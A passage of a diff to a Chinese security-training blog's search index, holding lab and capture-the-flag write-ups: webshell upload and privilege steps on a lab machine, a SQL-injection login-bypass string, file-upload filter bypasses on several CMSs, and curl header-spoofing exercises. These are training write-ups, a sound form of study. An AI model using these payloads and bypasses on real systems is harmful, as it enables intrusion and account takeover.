-<p><img src="/assets/image-20200512164400006.png" alt="image-20200512164400006"></p>
-<p>成功读取，再读admin.php，并解码：</p>
-<p><img src="/assets/image-20200512164625029.png" alt="image-20200512164625029"></p>
-<p>查出账户名为administhebest。密码的md5为 e6e061838856bf47e1de730719fb2609，md5解密后为admin@123.</p>
-<p>admin.php处输入账号密码：</p>
-<p><img src="/assets/image-20200512164816064.png" alt="image-20200512164816064"></p>
-<p>得到flag:</p>
-<p><img src="/assets/image-20200512164834411.png" alt="image-20200512164834411"></p>
-<p>点击后发现跳转空了，加一个xxe目录就可以。</p>
-<p><img src="/assets/image-20200512164917137.png" alt="image-20200512164917137"></p>
-<p>可能flag在源码里，那就读源码：</p>
-<p><img src="/assets/image-20200512165013929.png" alt="image-20200512165013929"></p>
-<p><img src="/assets/image-20200512165033499.png" alt="image-20200512165033499"></p>
-<p>得到flag：JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5。</p>
-<p>flag还可以再解码： L2V0Yy8uZmxhZy5waHA= </p>
-<p>再base64解码：</p>
-<p>/etc/.flag.php</p>
-<p>再读，由于是在etc目录下，所以用file协议读：</p>
-<p><img src="/assets/image-20200512165748626.png" alt="image-20200512165748626"></p>
-<p>很明显有加密，本地解密得到:</p>
-<p><img src="/assets/image-20200512170140547.png" alt="image-20200512170140547"></p>
-<p>发现不成功，原来是最后的?&gt;标识符打错了。</p>
-<p>重写后发现访问虽然成功了，但是没有结果。重新换一台windows电脑解密即可，flag:</p>
-<p>SAFCSP{xxe_is_so_easy}</p>
+<p>左上角显示SUCCESS，看来没什么过滤。</p>
+<p>不知道上传到哪了，找一下先前禁止的目录中的/uploaded_files和/uploads</p>
+<p>在/uploaded_files/yijuhua.php发现上传的一句话木马，用菜刀连接试试。不知道为什么连不上。换个大马上传下试试。上传小朋友大马再登录</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.118</span><span class="regexp">/uploaded_files/</span>xiaopengyou.php</span><br></pre></td></tr></table></figure>
+
+<p>成功连接上</p>
+<p>在根目录下发现文件hint.txt.</p>
+<p>里面有第三个flag</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">The <span class="number">3</span>rd flag <span class="keyword">is</span> : &#123;<span class="number">7645110034526579012345670</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还有提示：</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">try <span class="keyword">to</span> <span class="builtin-name">find</span><span class="built_in"> user </span>technawi password <span class="keyword">to</span> read the flag.txt file, you can <span class="builtin-name">find</span> it <span class="keyword">in</span> a hidden file ;)</span><br></pre></td></tr></table></figure>
+
+<p>而且里面还有flag.txt，发现没有权限。看上面的权限需要找到用户technawi的密码，而且提示在一个隐藏文件中。</p>
+<h3><span id="7找第四个flag">（7）找第四个flag</span></h3><p>下一关应该是相当难的，先在大马中反弹shell到自己端口上，然后利用shell进行操作。我找遍了网站下所有文件都没发现含有technawi密码的隐藏文件，因为它说是hidden file，我理解的是隐藏文件，所以一直在用ls查找。找不到了于是在全局找technawi，找半天也没找到对的，因为太多包含technawi的了。最后机智的想到是不是该找下一个flag了，按以前文件的格式应该是the 4th flag is,于是利用</p>
+<p>grep “the 4th flag”    #注意时间会比价慢</p>
+<p>终于在/etc/mysql/conf.d/credentials.txt文件中找出第四个flag</p>
+<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">The <span class="number">4</span>th flag <span class="keyword">is</span> : &#123;7845658974123568974185412&#125;</span><br><span class="line"></span><br><span class="line">username : <span class="type">technawi</span></span><br><span class="line">password : 3<span class="type">vilH</span>@ksor</span><br></pre></td></tr></table></figure>
+
+<p>The 4th flag is : {7845658974123568974185412}   </p>
+<h3><span id="7找第五个flag">（7）找第五个flag</span></h3><p>因为先前查找时已经发现flag.txt属于technawi用户，证明可以用technawi登录ssh，于是</p>
+<p>ssh <a href="mailto:technawi@192.168.1.118">technawi@192.168.1.118</a></p>
+<p>然后vim /var/www/html/flag.txt发现第五个flag</p>
+<p>technawi</p>
+<p>The 5th flag is : {5473215946785213456975249}</p>
+<p>Good job :)</p>
+<p>You find 5 flags and got their points and finish the first scenario….</p>
+<p>到此五个flag全部找出。</p>
+<p>[注]后来去网上寻找才发现直接用</p>
+<p>find / -user technawi 2&gt;/dev/null 寻找更快</p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
@@ -756,138 +764,6 @@
       <tags>
         <tag>靶机</tag>
         <tag>web</tag>
-        <tag>xxe</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>合天培训_实验_web安全之HTTP头部字段理解</title>
-    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_web%E5%AE%89%E5%85%A8%E4%B9%8BHTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%90%86%E8%A7%A3/</url>
-    <content><![CDATA[<p>本文主要是讲解http头部字段实验，实验的目的是加深对http请求头的理解。</p>
-<a id="more"></a>
-
-<h2><span id="第一题-观察http-响应头">第一题 观察HTTP 响应头</span></h2><p>题目提示观察http响应头所以只观察响应头即可。通过命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/1.php</span><br></pre></td></tr></table></figure>
-
-<p>得到:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: hello world!</span><br></pre></td></tr></table></figure>
-
-<h2><span id="第二题-referer理解">第二题 Referer理解</span></h2><p>提示必须从<a href="http://www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段" target="_blank" rel="noopener">www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段</a></p>
-<p>通过命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Referer:http://www.baidu.com 47.105.75.177/vulnlab/head/2.php</span><br></pre></td></tr></table></figure>
-
-<p>从响应中获取key:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
-
-<h2><span id="第三题-x-forwarded-for理解">第三题 X-Forwarded-For理解</span></h2><p>通过浏览器检查获取网址47.105.75.177/vulnlab/head/3.php，点击网址后自动跳转到 <a href="http://www.hetianlab.com/" target="_blank" rel="noopener">http://www.hetianlab.com/</a> 。先curl下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>
-
-<p>得到：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">this page only accept come from localhost</span><br></pre></td></tr></table></figure>
-
-<p>本地才能访问，所以伪造X-Forwarded-For为127.0.0.1</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H X-Forwarded-For:127.0.0.1 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>
-
-<p>得到key</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
-
-<h2><span id="第四题-user-agent理解">第四题 User-Agent理解</span></h2><p>题目提示只能从iPhone中发起访问，猜测检查不严格。直接伪造User-Agent:iPhone。curl命令：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H User-Agent:iPhone 47.105.75.177/vulnlab/head/4.php</span><br></pre></td></tr></table></figure>
-
-<p>得到key:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
-
-<p>第五题 Accept-Language理解</p>
-<p>题目提示只允许外国人登录,猜测接收语言为英语即可。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Accept-Language:en_us 47.105.75.177/vulnlab/head/5.php</span><br></pre></td></tr></table></figure>
-
-<h2><span id="第六题-cookie理解">第六题 Cookie理解</span></h2><p>题目提示一定要用admin登录，又是cookie，猜测cookie中有判断是否admin字段。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>
-
-<p>发现响应头中会设置cookie:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set-Cookie: Login=anonymous</span><br></pre></td></tr></table></figure>
-
-<p>所以请求时将cookie设置为Login=admin即可。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --cookie Login=admin 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>http</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>合天培训_实验_文件上传考核</title>
-    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%80%83%E6%A0%B8/</url>
-    <content><![CDATA[<p>本文主要讲解几个cms中出现的文件上传漏洞，以及对应的攻击方法。</p>
-<a id="more"></a>
-
-<h2><span id="1beecms">1.beecms</span></h2><p>首先后台登录</p>
-<p>绕过登录方法：</p>
-<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admi' Un union ion Se%select%lect <span class="number">1</span>,'admin','<span class="number">9003</span>d1df22eb4d3820015070385194c8',<span class="number">4</span>,<span class="number">0</span> #</span><br><span class="line">密码：pwd</span><br></pre></td></tr></table></figure>
-
-<p>在后台发现上传图片功能：</p>
-<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">http://47.105.75.177/vulnlab/sqli/beecms/admin/admin_content.php?action=<span class="meta">add</span><span class="variable">&amp;id</span>=3<span class="variable">&amp;nav</span>=add_channel_product<span class="variable">&amp;admin_p_nav</span>=content<span class="variable">&amp;lang</span>=cn</span><br></pre></td></tr></table></figure>
-
-<p>实际检测，发现是MIME白名单检测，所以Burp改包即可。</p>
-<p>然后在图片管理中可以看到上传的文件的路径：</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/vulnlab/</span>sqli<span class="regexp">/beecms/u</span>pload<span class="regexp">/img/</span><span class="number">202004201359505400</span>.php</span><br></pre></td></tr></table></figure>
-
-
-
-<h2><span id="2fiyocms">2.fiyocms</span></h2><p>账户密码admin/admin888登录</p>
-<p>找到上传文件的点：</p>
-<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/47.105.75.177/vulnlab</span><span class="regexp">/upload/fiyocms</span><span class="regexp">/dapur/</span>?app=media&amp;<span class="keyword">type</span>=files</span><br></pre></td></tr></table></figure>
-
-<p>但是上传按钮按不动。其他功能点也没有上传的，放弃。</p>
-<p>老师讲了后发现themes下面有漏洞。</p>
-<p>（1）任意文件读取</p>
-<p>（2）任意文件上传</p>
-<h2><span id="3phpok">3.phpok</span></h2><p>账户密码admin/admin登录</p>
-<p>找到修改头像的点，发现只能上传图像。</p>
-<p>上传一个后缀名改为gif的php代码。</p>
-<p>然后改包：</p>
-<p><img src="/assets/image-20200420145021307.png" alt="image-20200420145021307"></p>
-<p>发现php被过滤了。</p>
-<p>php fuzz测试。发现均被过滤了。</p>
-<p>换思路，扫后台</p>
-<p>扫出admin.php</p>
-<p>登录发现不正确，应该用户表和管理员表是两张。</p>
-<p>用户名：admin,密码： admin888 (利用其他网站的sql注入获得)</p>
-<p>在工具，附件分类管理中gif,png,jpg后面再加个php。然后再文件上传即可。</p>
-<p><img src="/assets/image-20200420154112973.png" alt="image-20200420154112973"></p>
-<p>看burp包得到上传路径：</p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">res/<span class="number">202004</span>/<span class="number">20</span>/<span class="number">1555e119f</span>9dc2b1f.php</span><br></pre></td></tr></table></figure>
-
-<p>访问资源即可：</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/phpok/</span>res<span class="regexp">/202004/</span><span class="number">20</span><span class="regexp">/1555e119f9dc2b1f.php</span></span><br></pre></td></tr></table></figure>
-
-<p>为了方便其他同学做再改回去。</p>
-<h2><span id="4geez">4.geez</span></h2><p>同样sql注入得到账户名密码：admin/admin445</p>
-<p>发现进去就有上传文件的点。用fuzz模糊测试发现很好绕过。直接php.即可。</p>
-<p>然后在主页再检查头像的地址：</p>
-<p>得到上传文件：</p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">./upload/<span class="number">1</span>_dama1.php.</span><br></pre></td></tr></table></figure>
-
-<p>访问：</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/denglu/u</span>pload<span class="regexp">/1_dama1.php.</span></span><br></pre></td></tr></table></figure>
-
-<p>发现不能解析。</p>
-<p>改为大小写绕过得到上传文件：</p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">./upload/<span class="number">1</span>_dama1.php</span><br></pre></td></tr></table></figure>
-
-<p>访问：</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/denglu/u</span>pload<span class="regexp">/1_dama1.php</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -1385,6 +1261,78 @@
       </tags>
   </entry>
   <entry>
+    <title>合天培训_实验_文件上传考核</title>
+    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%80%83%E6%A0%B8/</url>
+    <content><![CDATA[<p>本文主要讲解几个cms中出现的文件上传漏洞，以及对应的攻击方法。</p>
+<a id="more"></a>
+
+<h2><span id="1beecms">1.beecms</span></h2><p>首先后台登录</p>
+<p>绕过登录方法：</p>
+<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">用户名：admi' Un union ion Se%select%lect <span class="number">1</span>,'admin','<span class="number">9003</span>d1df22eb4d3820015070385194c8',<span class="number">4</span>,<span class="number">0</span> #</span><br><span class="line">密码：pwd</span><br></pre></td></tr></table></figure>
+
+<p>在后台发现上传图片功能：</p>
+<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">http://47.105.75.177/vulnlab/sqli/beecms/admin/admin_content.php?action=<span class="meta">add</span><span class="variable">&amp;id</span>=3<span class="variable">&amp;nav</span>=add_channel_product<span class="variable">&amp;admin_p_nav</span>=content<span class="variable">&amp;lang</span>=cn</span><br></pre></td></tr></table></figure>
+
+<p>实际检测，发现是MIME白名单检测，所以Burp改包即可。</p>
+<p>然后在图片管理中可以看到上传的文件的路径：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/vulnlab/</span>sqli<span class="regexp">/beecms/u</span>pload<span class="regexp">/img/</span><span class="number">202004201359505400</span>.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h2><span id="2fiyocms">2.fiyocms</span></h2><p>账户密码admin/admin888登录</p>
+<p>找到上传文件的点：</p>
+<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/47.105.75.177/vulnlab</span><span class="regexp">/upload/fiyocms</span><span class="regexp">/dapur/</span>?app=media&amp;<span class="keyword">type</span>=files</span><br></pre></td></tr></table></figure>
+
+<p>但是上传按钮按不动。其他功能点也没有上传的，放弃。</p>
+<p>老师讲了后发现themes下面有漏洞。</p>
+<p>（1）任意文件读取</p>
+<p>（2）任意文件上传</p>
+<h2><span id="3phpok">3.phpok</span></h2><p>账户密码admin/admin登录</p>
+<p>找到修改头像的点，发现只能上传图像。</p>
+<p>上传一个后缀名改为gif的php代码。</p>
+<p>然后改包：</p>
+<p><img src="/assets/image-20200420145021307.png" alt="image-20200420145021307"></p>
+<p>发现php被过滤了。</p>
+<p>php fuzz测试。发现均被过滤了。</p>
+<p>换思路，扫后台</p>
+<p>扫出admin.php</p>
+<p>登录发现不正确，应该用户表和管理员表是两张。</p>
+<p>用户名：admin,密码： admin888 (利用其他网站的sql注入获得)</p>
+<p>在工具，附件分类管理中gif,png,jpg后面再加个php。然后再文件上传即可。</p>
+<p><img src="/assets/image-20200420154112973.png" alt="image-20200420154112973"></p>
+<p>看burp包得到上传路径：</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">res/<span class="number">202004</span>/<span class="number">20</span>/<span class="number">1555e119f</span>9dc2b1f.php</span><br></pre></td></tr></table></figure>
+
+<p>访问资源即可：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/phpok/</span>res<span class="regexp">/202004/</span><span class="number">20</span><span class="regexp">/1555e119f9dc2b1f.php</span></span><br></pre></td></tr></table></figure>
+
+<p>为了方便其他同学做再改回去。</p>
+<h2><span id="4geez">4.geez</span></h2><p>同样sql注入得到账户名密码：admin/admin445</p>
+<p>发现进去就有上传文件的点。用fuzz模糊测试发现很好绕过。直接php.即可。</p>
+<p>然后在主页再检查头像的地址：</p>
+<p>得到上传文件：</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">./upload/<span class="number">1</span>_dama1.php.</span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/denglu/u</span>pload<span class="regexp">/1_dama1.php.</span></span><br></pre></td></tr></table></figure>
+
+<p>发现不能解析。</p>
+<p>改为大小写绕过得到上传文件：</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">./upload/<span class="number">1</span>_dama1.php</span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/denglu/u</span>pload<span class="regexp">/1_dama1.php</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>合天培训_实验_文件包含漏洞</title>
     <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>本文主要描述了文件包含漏洞实验，包括本地文件包含和远程文件包含，以及攻击方法。</p>
@@ -1445,6 +1393,65 @@
       <tags>
         <tag>web</tag>
         <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>合天培训_实验_web安全之HTTP头部字段理解</title>
+    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_web%E5%AE%89%E5%85%A8%E4%B9%8BHTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%90%86%E8%A7%A3/</url>
+    <content><![CDATA[<p>本文主要是讲解http头部字段实验，实验的目的是加深对http请求头的理解。</p>
+<a id="more"></a>
+
+<h2><span id="第一题-观察http-响应头">第一题 观察HTTP 响应头</span></h2><p>题目提示观察http响应头所以只观察响应头即可。通过命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/1.php</span><br></pre></td></tr></table></figure>
+
+<p>得到:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: hello world!</span><br></pre></td></tr></table></figure>
+
+<h2><span id="第二题-referer理解">第二题 Referer理解</span></h2><p>提示必须从<a href="http://www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段" target="_blank" rel="noopener">www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段</a></p>
+<p>通过命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Referer:http://www.baidu.com 47.105.75.177/vulnlab/head/2.php</span><br></pre></td></tr></table></figure>
+
+<p>从响应中获取key:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
+
+<h2><span id="第三题-x-forwarded-for理解">第三题 X-Forwarded-For理解</span></h2><p>通过浏览器检查获取网址47.105.75.177/vulnlab/head/3.php，点击网址后自动跳转到 <a href="http://www.hetianlab.com/" target="_blank" rel="noopener">http://www.hetianlab.com/</a> 。先curl下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">this page only accept come from localhost</span><br></pre></td></tr></table></figure>
+
+<p>本地才能访问，所以伪造X-Forwarded-For为127.0.0.1</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H X-Forwarded-For:127.0.0.1 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>
+
+<p>得到key</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
+
+<h2><span id="第四题-user-agent理解">第四题 User-Agent理解</span></h2><p>题目提示只能从iPhone中发起访问，猜测检查不严格。直接伪造User-Agent:iPhone。curl命令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H User-Agent:iPhone 47.105.75.177/vulnlab/head/4.php</span><br></pre></td></tr></table></figure>
+
+<p>得到key:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
+
+<p>第五题 Accept-Language理解</p>
+<p>题目提示只允许外国人登录,猜测接收语言为英语即可。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Accept-Language:en_us 47.105.75.177/vulnlab/head/5.php</span><br></pre></td></tr></table></figure>
+
+<h2><span id="第六题-cookie理解">第六题 Cookie理解</span></h2><p>题目提示一定要用admin登录，又是cookie，猜测cookie中有判断是否admin字段。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>
+
+<p>发现响应头中会设置cookie:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set-Cookie: Login=anonymous</span><br></pre></td></tr></table></figure>
+
+<p>所以请求时将cookie设置为Login=admin即可。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --cookie Login=admin 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>http</tag>
       </tags>
   </entry>
 </search>
